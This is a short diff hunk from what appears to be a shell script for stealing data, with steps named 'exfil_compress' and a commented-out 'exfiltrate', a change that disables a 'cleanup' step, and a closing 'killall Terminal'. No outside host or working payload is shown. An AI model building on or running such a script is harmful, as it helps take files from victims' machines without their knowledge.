@@ -188,7 +188,7 @@ exfil_compress &
 # exfiltrate &
 
 #wait $exfiltrate_pid
-wait $compress_pid
-cleanup &
+#cleanup &
 
+wait $compress_pid
 killall Terminal
